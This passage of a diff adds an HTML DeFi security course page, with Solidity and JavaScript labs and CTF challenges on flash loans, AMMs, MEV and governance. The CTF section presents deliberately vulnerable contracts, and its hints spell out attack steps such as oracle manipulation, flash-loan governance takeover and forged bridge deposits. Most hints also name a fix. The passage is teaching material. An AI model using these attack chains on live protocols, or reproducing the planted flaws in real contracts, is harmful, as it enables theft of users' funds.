+              <li>How much capital would you need to move the Uniswap price by 10%?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Liquidity Provision and Impermanent Loss</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Provide liquidity to a Uniswap V2 pool, simulate price movement, and calculate impermanent loss vs just holding the tokens.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+// Simplified AMM for IL calculation
+contract ILCalculator {
+    // Calculate impermanent loss given price ratio change
+    // price_ratio = new_price / old_price
+    // IL = 2 * sqrt(price_ratio) / (1 + price_ratio) - 1
+    function impermanentLoss(uint256 priceRatioBps) public pure returns (int256) {
+        // priceRatioBps = 15000 means price went up 50% (1.5x)
+        // Returns IL in basis points (negative = loss)
+
+        // Using fixed-point math:
+        // sqrt approximation for demonstration
+        uint256 sqrtRatio = sqrt(priceRatioBps * 10000);  // sqrt(ratio * 10000)
+        uint256 numerator = 2 * sqrtRatio;
+        uint256 denominator = 10000 + priceRatioBps;
+        int256 il = int256(numerator * 10000 / denominator) - 10000;
+        return il;  // negative = loss vs holding
+    }
+
+    function sqrt(uint256 x) internal pure returns (uint256) {
+        if (x == 0) return 0;
+        uint256 z = (x + 1) / 2;
+        uint256 y = x;
+        while (z &lt; y) { y = z; z = (x / z + z) / 2; }
+        return y;
+    }
+}</code></pre>
+<pre><code class="language-bash"># Impermanent loss examples:
+# 1.25x price change → ~0.6% IL
+# 1.50x price change → ~2.0% IL
+# 2.00x price change → ~5.7% IL
+# 3.00x price change → ~13.4% IL
+# 5.00x price change → ~25.5% IL</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Deploy and calculate IL for various price ratios</li>
+              <li>Verify against the formula manually</li>
+              <li>At what price change does IL exceed typical trading fee earnings?</li>
+              <li>Why is IL called "impermanent"? When does it become permanent?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: Yield Farming Simulation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Build a simple staking/farming contract that distributes reward tokens proportionally to stakers over time.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract RewardToken is ERC20 {
+    constructor() ERC20("Reward", "RWD") {
+        _mint(msg.sender, 1_000_000 ether);
+    }
+}
+
+contract StakingFarm {
+    IERC20 public stakingToken;
+    IERC20 public rewardToken;
+
+    uint256 public rewardRate = 100;  // rewards per second
+    uint256 public lastUpdateTime;
+    uint256 public rewardPerTokenStored;
+
+    mapping(address => uint256) public userRewardPerTokenPaid;
+    mapping(address => uint256) public rewards;
+    mapping(address => uint256) public staked;
+    uint256 public totalStaked;
+
+    constructor(address _stakingToken, address _rewardToken) {
+        stakingToken = IERC20(_stakingToken);
+        rewardToken = IERC20(_rewardToken);
+    }
+
+    function rewardPerToken() public view returns (uint256) {
+        if (totalStaked == 0) return rewardPerTokenStored;
+        return rewardPerTokenStored +
+            ((block.timestamp - lastUpdateTime) * rewardRate * 1e18) / totalStaked;
+    }
+
+    function earned(address account) public view returns (uint256) {
+        return (staked[account] * (rewardPerToken() - userRewardPerTokenPaid[account])) / 1e18
+            + rewards[account];
+    }
+
+    modifier updateReward(address account) {
+        rewardPerTokenStored = rewardPerToken();
+        lastUpdateTime = block.timestamp;
+        rewards[account] = earned(account);
+        userRewardPerTokenPaid[account] = rewardPerTokenStored;
+        _;
+    }
+
+    function stake(uint256 amount) external updateReward(msg.sender) {
+        totalStaked += amount;
+        staked[msg.sender] += amount;
+        stakingToken.transferFrom(msg.sender, address(this), amount);
+    }
+
+    function withdraw(uint256 amount) external updateReward(msg.sender) {
+        totalStaked -= amount;
+        staked[msg.sender] -= amount;
+        stakingToken.transfer(msg.sender, amount);
+    }
+
+    function claimReward() external updateReward(msg.sender) {
+        uint256 reward = rewards[msg.sender];
+        rewards[msg.sender] = 0;
+        rewardToken.transfer(msg.sender, reward);
+    }
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Deploy with two different ERC-20 tokens</li>
+              <li>Stake with two different accounts, advance time, and verify proportional rewards</li>
+              <li>What happens if someone stakes 1 wei just to drain rewards? (dust attack)</li>
+              <li>How does Synthetix's StakingRewards contract differ from this?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: MEV Bot Basics</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Write a simple arbitrage bot that monitors two Uniswap V2 pools for price discrepancies and executes profitable trades atomically.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+interface IUniswapV2Pair {
+    function getReserves() external view returns (uint112, uint112, uint32);
+    function swap(uint, uint, address, bytes calldata) external;
+}
+
+contract SimpleArbitrage {
+    address public owner;
+
+    constructor() { owner = msg.sender; }
+
+    // Atomic arbitrage: buy on pool A, sell on pool B
+    function execute(
+        address pairA,
+        address pairB,
+        address tokenIn,
+        address tokenOut,
+        uint256 amountIn
+    ) external {
+        require(msg.sender == owner, "Not owner");
+
+        // Get token from owner
+        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
+
+        // Swap on pool A: tokenIn → tokenOut
+        IERC20(tokenIn).transfer(pairA, amountIn);
+        (uint112 r0A, uint112 r1A, ) = IUniswapV2Pair(pairA).getReserves();
+        uint256 amountOut = getAmountOut(amountIn, uint256(r0A), uint256(r1A));
+        IUniswapV2Pair(pairA).swap(0, amountOut, address(this), "");
+
+        // Swap on pool B: tokenOut → tokenIn (at better rate)
+        IERC20(tokenOut).transfer(pairB, amountOut);
+        (uint112 r0B, uint112 r1B, ) = IUniswapV2Pair(pairB).getReserves();
+        uint256 finalAmount = getAmountOut(amountOut, uint256(r1B), uint256(r0B));
+        IUniswapV2Pair(pairB).swap(finalAmount, 0, msg.sender, "");
+
+        require(finalAmount > amountIn, "No profit");
+    }
+
+    function getAmountOut(uint256 amIn, uint256 rIn, uint256 rOut)
+        internal pure returns (uint256) {
+        uint256 amInFee = amIn * 997;
+        return (amInFee * rOut) / (rIn * 1000 + amInFee);
+    }
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Deploy on a mainnet fork with two pools that have different prices</li>
+              <li>Calculate the optimal trade amount for maximum profit</li>
+              <li>What prevents this from working on mainnet? (MEV competition, gas costs)</li>
+              <li>Research Flashbots bundles — how do MEV searchers guarantee execution order?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Governance Voting Mechanism</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Implement an on-chain governance system with proposal creation, voting periods, and execution timelocks.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract GovToken is ERC20 {
+    constructor() ERC20("GovToken", "GOV") {
+        _mint(msg.sender, 1_000_000 ether);
+    }
+}
+
+contract SimpleGovernor {
+    IERC20 public token;
+    uint256 public constant VOTING_PERIOD = 3 days;
+    uint256 public constant QUORUM = 100_000 ether;  // 10% of supply
+
+    struct Proposal {
+        address target;
+        bytes data;
+        uint256 forVotes;
+        uint256 againstVotes;
+        uint256 deadline;
+        bool executed;
+        mapping(address => bool) hasVoted;
+    }
+
+    Proposal[] public proposals;
+
+    constructor(address _token) { token = IERC20(_token); }
+
+    function propose(address target, bytes calldata data) external returns (uint256) {
+        require(token.balanceOf(msg.sender) >= 10_000 ether, "Need 1% to propose");
+        uint256 id = proposals.length;
+        Proposal storage p = proposals.push();
+        p.target = target;
+        p.data = data;
+        p.deadline = block.timestamp + VOTING_PERIOD;
+        return id;
+    }
+
+    function vote(uint256 proposalId, bool support) external {
+        Proposal storage p = proposals[proposalId];
+        require(block.timestamp &lt; p.deadline, "Voting ended");
+        require(!p.hasVoted[msg.sender], "Already voted");
+        p.hasVoted[msg.sender] = true;
+        uint256 weight = token.balanceOf(msg.sender);
+        if (support) p.forVotes += weight;
+        else p.againstVotes += weight;
+    }
+
+    function execute(uint256 proposalId) external {
+        Proposal storage p = proposals[proposalId];
+        require(block.timestamp >= p.deadline, "Voting active");
+        require(!p.executed, "Already executed");
+        require(p.forVotes > p.againstVotes, "Rejected");
+        require(p.forVotes >= QUORUM, "Quorum not met");
+        p.executed = true;
+        (bool ok, ) = p.target.call(p.data);
+        require(ok, "Execution failed");
+    }
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Deploy with a governance token and create a proposal</li>
+              <li>Vote with multiple accounts and execute after the voting period</li>
+              <li>What vulnerability exists with flash-loan-based voting? (snapshot needed)</li>
+              <li>Add vote delegation support</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: AMM Math — Constant Product Deep Dive</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Implement the core constant product AMM math, including swap calculations, slippage, and price impact.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract AMMCalculator {
+    // Core formula: x * y = k (invariant)
+    // After swap: (x + dx) * (y - dy) = k
+    // Solving: dy = y * dx / (x + dx)
+
+    function getAmountOut(
+        uint256 amountIn,
+        uint256 reserveIn,
+        uint256 reserveOut
+    ) public pure returns (uint256) {
+        uint256 amountInWithFee = amountIn * 997;  // 0.3% fee
+        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
+    }
+
+    // Price impact: how much the price moves for a given trade
+    function priceImpact(
+        uint256 amountIn,
+        uint256 reserveIn,
+        uint256 reserveOut
+    ) public pure returns (uint256) {
+        // Spot price before: reserveOut / reserveIn
+        // Effective price: amountOut / amountIn
+        uint256 amountOut = getAmountOut(amountIn, reserveIn, reserveOut);
+        uint256 spotPrice = reserveOut * 1e18 / reserveIn;
+        uint256 effectivePrice = amountOut * 1e18 / amountIn;
+        // Impact in basis points
+        return (spotPrice - effectivePrice) * 10000 / spotPrice;
+    }
+
+    // Calculate optimal swap amount for arbitrage between two pools
+    function optimalArbitrageAmount(
+        uint256 rA_in, uint256 rA_out,  // pool A reserves
+        uint256 rB_in, uint256 rB_out   // pool B reserves
+    ) public pure returns (uint256) {
+        // Complex calculation — simplified:
+        // Trade enough to equalize prices across pools
+        // Real formula involves solving quadratic equation
+        return 0; // TODO: implement
+    }
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Calculate swap output for 1 ETH in a 100ETH/200000DAI pool</li>
+              <li>What's the price impact of swapping 10 ETH vs 1 ETH?</li>
+              <li>At what trade size does slippage exceed 1%?</li>
+              <li>Implement the optimal arbitrage calculation</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Flashbots Usage — Private Transactions</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Submit a transaction via Flashbots Protect to avoid the public mempool and prevent front-running.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">const { ethers } = require("ethers");
+const { FlashbotsBundleProvider } = require("@flashbots/ethers-provider-bundle");
+
+async function main() {
+    // Standard provider
+    const provider = new ethers.JsonRpcProvider("https://eth-mainnet.g.alchemy.com/v2/KEY");
+    const wallet = new ethers.Wallet("PRIVATE_KEY", provider);
+
+    // Flashbots provider
+    const authSigner = ethers.Wallet.createRandom();
+    const flashbotsProvider = await FlashbotsBundleProvider.create(
+        provider, authSigner, "https://relay.flashbots.net"
+    );
+
+    const blockNumber = await provider.getBlockNumber();
+
+    // Create bundle: your transaction(s) executed atomically
+    const bundle = [
+        {
+            signer: wallet,
+            transaction: {
+                to: "0xTargetContract",
+                data: "0x...",  // your calldata
+                gasLimit: 300000,
+                maxFeePerGas: ethers.parseUnits("50", "gwei"),
+                maxPriorityFeePerGas: ethers.parseUnits("3", "gwei"),
+                chainId: 1,
+                type: 2,
+            }
+        }
+    ];
+
+    // Simulate first (dry run)
+    const simulation = await flashbotsProvider.simulate(bundle, blockNumber + 1);
+    console.log("Simulation:", simulation);
+
+    // Submit bundle (targets next block)
+    const result = await flashbotsProvider.sendBundle(bundle, blockNumber + 1);
+    const resolution = await result.wait();
+    console.log("Resolution:", resolution);
+}
+
+main();</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Set up Flashbots provider with an auth signer</li>
+              <li>Simulate a bundle and check the gas usage</li>
+              <li>Why do Flashbots bundles prevent sandwich attacks?</li>
+              <li>What is the difference between Flashbots Protect and Flashbots Auction?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Sandwich Attack Detector</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Write a script that analyzes Ethereum blocks for sandwich attack patterns — identify front-run/back-run transaction pairs around DEX swaps.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">const { ethers } = require("ethers");
+
+const UNISWAP_ROUTER = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
+const SWAP_SIGS = [
+    "0x38ed1739",  // swapExactTokensForTokens
+    "0x7ff36ab5",  // swapExactETHForTokens
+    "0x18cbafe5",  // swapExactTokensForETH
+];
+
+async function detectSandwiches(provider, blockNumber) {
+    const block = await provider.getBlock(blockNumber, true);
+    const txs = block.prefetchedTransactions;
+    const swaps = [];
+
+    // Find all Uniswap swaps in the block
+    for (let i = 0; i &lt; txs.length; i++) {
+        const tx = txs[i];
+        if (tx.to?.toLowerCase() === UNISWAP_ROUTER.toLowerCase()) {
+            const sig = tx.data.slice(0, 10);
+            if (SWAP_SIGS.includes(sig)) {
+                swaps.push({ index: i, tx, from: tx.from });
+            }
+        }
+    }
+
+    // Detect pattern: same address swaps BEFORE and AFTER a victim swap
+    for (let i = 0; i &lt; swaps.length - 2; i++) {
+        const front = swaps[i];
+        const victim = swaps[i + 1];
+        const back = swaps[i + 2];
+
+        if (front.from === back.from &amp;&amp; front.from !== victim.from) {
+            console.log("🥪 Potential sandwich detected!");
+            console.log("  Front-run:", front.tx.hash);
+            console.log("  Victim:   ", victim.tx.hash);
+            console.log("  Back-run: ", back.tx.hash);
+            console.log("  Attacker: ", front.from);
+        }
+    }
+}
+
+// Scan recent blocks
+const provider = new ethers.JsonRpcProvider("RPC_URL");
+detectSandwiches(provider, "latest");</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run against recent Ethereum blocks and identify sandwich attacks</li>
+              <li>Calculate the victim's excess slippage (difference between expected and actual output)</li>
+              <li>How much profit did the attacker make? (compare front-run buy price vs back-run sell price)</li>
+              <li>Extend to detect JIT liquidity attacks</li>
+            </ol>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Simple Flash Loan Arbitrage</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Two AMM pools have different prices for the same token pair. Pool A sells TOKEN at 1 ETH, Pool B buys TOKEN at 1.5 ETH. Write a flash loan contract that borrows ETH, buys TOKEN on Pool A, sells on Pool B, repays the loan, and profits.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IPool {
+    function swap(address tokenIn, uint256 amountIn) external returns (uint256);
+}
+
+interface IFlashProvider {
+    function flashLoan(address receiver, uint256 amount) external;
+}
+
+contract ArbitrageChallenge {
+    IPool public poolA;     // TOKEN is cheap here
+    IPool public poolB;     // TOKEN is expensive here
+    IFlashProvider public lender;
+    // TODO: Implement the arbitrage logic
+    // Your contract should:
+    // 1. Request flash loan of ETH
+    // 2. Buy TOKEN on Pool A (cheap)
+    // 3. Sell TOKEN on Pool B (expensive)
+    // 4. Repay flash loan + fee
+    // 5. Keep profit
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> In <code>onFlashLoan()</code>: approve Pool A, swap ETH &rarr; TOKEN, then approve Pool B, swap TOKEN &rarr; ETH. The ETH received from Pool B should be more than the loan + fee. Transfer the profit to your EOA at the end. Remember to handle token approvals before each swap.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: Manipulate Oracle to Drain Pool</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A lending protocol uses a Uniswap-style AMM as its price oracle. You have 10 ETH. The protocol holds 100,000 USDC. Manipulate the price and drain the protocol. You must profit after repaying any flash loans.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract OracleChallenge {
+    // AMM: ETH/USDC pool with 1000 ETH and 2,000,000 USDC (price = 2000 USDC/ETH)
+    // Lender: reads AMM.getPrice() to value ETH collateral
+    // Lender holds: 100,000 USDC available to borrow
+
+    // Your mission:
+    // 1. Flash loan a large amount of USDC
+    // 2. Dump USDC into the AMM (buy ETH) → ETH price increases
+    // 3. Deposit your 10 ETH as collateral (now overvalued by lender)
+    // 4. Borrow max USDC from lender
+    // 5. Swap ETH back on AMM to get USDC
+    // 6. Repay flash loan
+    // 7. Profit
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> Flash borrow 5M USDC, swap into AMM to buy ETH. This pushes ETH price from 2000 to maybe 10,000+ USDC/ETH. Now your 10 ETH collateral is "worth" 100k+ USDC to the lender. Borrow the full 100k USDC. Swap your AMM ETH back to USDC (price normalizes). Repay the 5M flash loan. Your profit is the 100k USDC minus any slippage/fees from the swap.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Multi-Step DeFi Exploit</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A DeFi ecosystem has three interacting protocols: a flash loan provider, a DEX with a governance token, and a yield vault that uses the DEX price as its oracle. The vault also allows governance token holders to vote on emergency withdrawals. Chain exploits across all three to drain the vault.</p>
+<pre><code class="language-solidity">// The ecosystem:
+// 1. FlashLender: provides flash loans of ETH
+// 2. GovDEX: AMM with a GOV token; GOV holders can vote on GovDEX proposals
+// 3. YieldVault:
+//    - Uses GovDEX.getPrice() for collateral valuation
+//    - GOV holders with >50% supply can trigger emergencyWithdraw()
+//    - Holds 500 ETH in deposits
+
+// Attack plan (combine at least 2 exploit types):
+// Option A: Flash loan → buy GOV → manipulate price → overborrow from vault
+// Option B: Flash loan → buy >50% GOV → vote emergency withdraw → drain vault
+// Option C: Flash loan → manipulate price → deposit overvalued collateral → borrow
+//           → also use GOV voting to disable withdrawal limits
+
+// Implement ONE of these multi-step attack chains</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> Option B is the most straightforward: (1) Flash borrow enough ETH to buy &gt;50% of GOV supply from the DEX. (2) Call <code>vault.emergencyWithdraw()</code> which checks <code>govToken.balanceOf(msg.sender) &gt; govToken.totalSupply() / 2</code>. (3) Receive 500 ETH from vault. (4) Sell GOV back to DEX for ETH. (5) Repay flash loan. Profit = 500 ETH minus swap slippage and flash loan fee. For Option A/C, you need to manipulate <code>getPrice()</code> by skewing AMM reserves with the flash-loaned capital.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Flash Loan Arbitrage</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Two AMM pools have the same token pair but different prices. Pool A has ETH/DAI at 1:2000, Pool B has ETH/DAI at 1:2200. You have 0 capital. Use a flash loan to arbitrage the difference and profit.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract PoolA {
+    uint256 public reserveETH = 1000 ether;
+    uint256 public reserveDAI = 2_000_000 ether;  // 1 ETH = 2000 DAI
+
+    function swapETHForDAI() external payable returns (uint256) {
+        uint256 daiOut = (reserveDAI * msg.value) / (reserveETH + msg.value);
+        reserveETH += msg.value;
+        reserveDAI -= daiOut;
+        // transfer DAI to caller...
+        return daiOut;
+    }
+}
+
+contract PoolB {
+    uint256 public reserveETH = 500 ether;
+    uint256 public reserveDAI = 1_100_000 ether;  // 1 ETH = 2200 DAI
+
+    function swapDAIForETH(uint256 daiIn) external returns (uint256) {
+        uint256 ethOut = (reserveETH * daiIn) / (reserveDAI + daiIn);
+        reserveDAI += daiIn;
+        reserveETH -= ethOut;
+        payable(msg.sender).transfer(ethOut);
+        return ethOut;
+    }
+}
+
+// TODO: Write ArbitrageBot that:
+// 1. Flash borrows ETH
+// 2. Swaps ETH→DAI on Pool A (cheap ETH)
+// 3. Swaps DAI→ETH on Pool B (expensive ETH)
+// 4. Repays flash loan + fee
+// 5. Keeps profit</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> Flash borrow 100 ETH → swap on Pool A for ~180,000 DAI → swap DAI on Pool B for ~108 ETH → repay 100 ETH + 0.09 fee → profit ~7.9 ETH. The profit depends on the trade size and pool liquidity. Larger trades have more price impact. Calculate the optimal amount using: <code>profit = amountOutB - amountIn - fee</code>. Binary search for the optimal <code>amountIn</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Price Manipulation via Donation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A yield vault calculates share price as <code>totalAssets / totalShares</code>. You're the first depositor. Exploit the share price calculation to steal from the next depositor by donating tokens to inflate the share price.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+contract VulnerableVault {
+    IERC20 public token;
+    mapping(address => uint256) public shares;
+    uint256 public totalShares;
+
+    constructor(address _token) { token = IERC20(_token); }
+
+    function deposit(uint256 amount) external returns (uint256 sharesToMint) {
+        uint256 totalAssets = token.balanceOf(address(this));
+        if (totalShares == 0) {
+            sharesToMint = amount;
+        } else {
+            sharesToMint = (amount * totalShares) / totalAssets;
+        }
+        shares[msg.sender] += sharesToMint;
+        totalShares += sharesToMint;
+        token.transferFrom(msg.sender, address(this), amount);
+    }
+
+    function withdraw(uint256 shareAmount) external returns (uint256) {
+        uint256 totalAssets = token.balanceOf(address(this));
+        uint256 payout = (shareAmount * totalAssets) / totalShares;
+        shares[msg.sender] -= shareAmount;
+        totalShares -= shareAmount;
+        token.transfer(msg.sender, payout);
+        return payout;
+    }
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> (1) Deposit 1 wei of token → get 1 share. (2) Donate (transfer directly, not via deposit) 10,000 tokens to the vault. (3) Now 1 share = 10,000 tokens. (4) When victim deposits 9,999 tokens: <code>shares = 9999 * 1 / 10001 = 0</code> (rounds down to 0). Victim gets 0 shares but their tokens are in the vault. (5) Withdraw your 1 share → get all ~20,000 tokens. Fix: require minimum initial deposit, or use virtual shares (ERC-4626 pattern with offset).</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: Governance Takeover</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A DAO governance contract allows instant proposal execution and reads token balances at the current block (no snapshot). Use a flash loan to temporarily acquire voting power and pass a malicious proposal.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract FlashGov {
+    IERC20 public govToken;
+    address public treasury;
+    uint256 public constant QUORUM = 500_000 ether;
+
+    struct Proposal {
+        address target;
+        bytes data;
+        uint256 votesFor;
+        bool executed;
+    }
+
+    Proposal[] public proposals;
+
+    constructor(address _token, address _treasury) {
+        govToken = IERC20(_token);
+        treasury = _treasury;
+    }
+
+    function propose(address target, bytes calldata data) external returns (uint256) {
+        proposals.push(Proposal(target, data, 0, false));
+        return proposals.length - 1;
+    }
+
+    function vote(uint256 id) external {
+        // BUG: reads current balance, no snapshot!
+        uint256 weight = govToken.balanceOf(msg.sender);
+        proposals[id].votesFor += weight;
+    }
+
+    function execute(uint256 id) external {
+        Proposal storage p = proposals[id];
+        require(p.votesFor >= QUORUM, "Quorum not met");
+        require(!p.executed, "Done");
+        p.executed = true;
+        (bool ok, ) = p.target.call(p.data);
+        require(ok);
+    }
+}
+
+// Attack: flash borrow 500k GOV → propose(drain treasury) → vote → execute → return tokens</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> All in one transaction: (1) Flash borrow GOV tokens from a lending protocol. (2) Call <code>propose(treasury, abi.encodeWithSignature("transfer(address,uint256)", attacker, balance))</code>. (3) Call <code>vote(proposalId)</code> — your flash-loaned balance counts. (4) Call <code>execute(proposalId)</code> — proposal passes quorum. (5) Return flash-loaned tokens. Fix: use ERC-20 snapshots (<code>getPastVotes()</code>) and require a voting delay between proposal and vote.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: Liquidity Drain</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A buggy AMM allows adding zero-amount liquidity and receiving LP tokens based on minimum ratio calculations. Exploit the rounding error to mint LP tokens for free and drain the pool.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract BuggyAMM {
+    uint256 public reserveA;
+    uint256 public reserveB;
+    mapping(address => uint256) public lpTokens;
+    uint256 public totalLP;
+
+    function addLiquidity(uint256 amountA, uint256 amountB) external {
+        if (totalLP == 0) {
+            lpTokens[msg.sender] = 1000;
+            totalLP = 1000;
+        } else {
+            // BUG: doesn't require both amounts > 0
+            uint256 lpA = (amountA * totalLP) / reserveA;
+            uint256 lpB = (amountB * totalLP) / reserveB;
+            uint256 lp = lpA &lt; lpB ? lpA : lpB;  // minimum of two
+            // BUG: if one amount is 0, lp = 0, but we don't check
+            // Another bug: doesn't actually transfer tokens in this simplified version
+            lpTokens[msg.sender] += lp;
+            totalLP += lp;
+        }
+        reserveA += amountA;
+        reserveB += amountB;
+    }
+
+    function removeLiquidity(uint256 lpAmount) external {
+        uint256 amountA = (lpAmount * reserveA) / totalLP;
+        uint256 amountB = (lpAmount * reserveB) / totalLP;
+        lpTokens[msg.sender] -= lpAmount;
+        totalLP -= lpAmount;
+        reserveA -= amountA;
+        reserveB -= amountB;
+        // transfer amountA and amountB to msg.sender
+    }
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> Look at the initial liquidity addition — first depositor always gets 1000 LP regardless of the amounts provided. They could deposit 1 wei of each token and get 1000 LP. Then they can <code>removeLiquidity(1000)</code> after someone else deposits a large amount — their LP shares represent a proportional claim on all pool assets including the later deposits. Also: the contract doesn't actually enforce token transfers, so you can add "liquidity" without sending any tokens.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: Bridge Exploit</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">This simplified cross-chain bridge verifies deposits using a trusted oracle. The oracle's message validation has a flaw. Forge a deposit proof to mint unbacked tokens on the destination chain.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract VulnerableBridge {
+    address public oracle;
+    mapping(bytes32 => bool) public processedMessages;
+    mapping(address => uint256) public wrappedBalance;
+
+    constructor(address _oracle) { oracle = _oracle; }
+
+    // Called on destination chain to mint wrapped tokens
+    function processDeposit(
+        address depositor,
+        uint256 amount,
+        bytes32 sourceChainTxHash,
+        bytes calldata signature
+    ) external {
+        bytes32 msgHash = keccak256(abi.encodePacked(depositor, amount, sourceChainTxHash));
+        require(!processedMessages[msgHash], "Already processed");
+
+        // BUG: doesn't verify that signature is from oracle!
+        // Anyone can call this with any values
+        // Should: require(recoverSigner(msgHash, signature) == oracle)
+
+        processedMessages[msgHash] = true;
+        wrappedBalance[depositor] += amount;
+    }
+
+    function withdraw(uint256 amount) external {
+        require(wrappedBalance[msg.sender] >= amount);
+        wrappedBalance[msg.sender] -= amount;
+        payable(msg.sender).transfer(amount);
+    }
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> The <code>processDeposit</code> function accepts a signature parameter but never validates it. Call it with any <code>depositor</code> (your address), any <code>amount</code> (huge), any <code>sourceChainTxHash</code> (random), and any <code>signature</code> (empty or garbage). The contract processes the fake deposit and credits your account. This mirrors real bridge exploits like Wormhole ($320M) where the verification step was bypassed. Fix: implement proper ECDSA signature verification against the oracle's public key.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: LP Token Manipulation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A lending protocol accepts LP tokens as collateral and values them using the underlying pool's reserves. Manipulate the pool's reserves to inflate your LP token value and overborrow.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract SimpleLPLender {
+    address public lpToken;
+    address public pool;  // AMM pool
+    mapping(address => uint256) public collateral;  // LP tokens deposited
+
+    constructor(address _lp, address _pool) payable {
+        lpToken = _lp;
+        pool = _pool;
+    }
+
+    // Vulnerable: values LP using current reserves
